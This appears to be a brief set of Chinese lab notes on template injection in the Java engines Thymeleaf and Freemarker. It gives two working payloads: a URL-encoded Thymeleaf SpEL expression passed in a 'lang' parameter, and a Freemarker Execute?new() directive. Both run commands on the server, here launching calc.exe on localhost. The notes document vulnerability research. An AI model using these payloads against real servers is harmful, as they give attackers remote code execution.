## 模板引擎Thymeleaf

修改版本再 maven

![image-20260208145620027](images/image-20260208145620027.png)

![image-20260208134217468](images/image-20260208134217468.png)

```
http://127.0.0.1:8080/index?name=123&lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x
```

![image-20260208150216032](images/image-20260208150216032.png)

### Freemarker

必须在文件中有这个poc才行，不算漏洞只是支持这个语法

![image-20260208200727630](images/image-20260208200727630.png)

![image-20260208200510865](images/image-20260208200510865.png)

```
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}
```

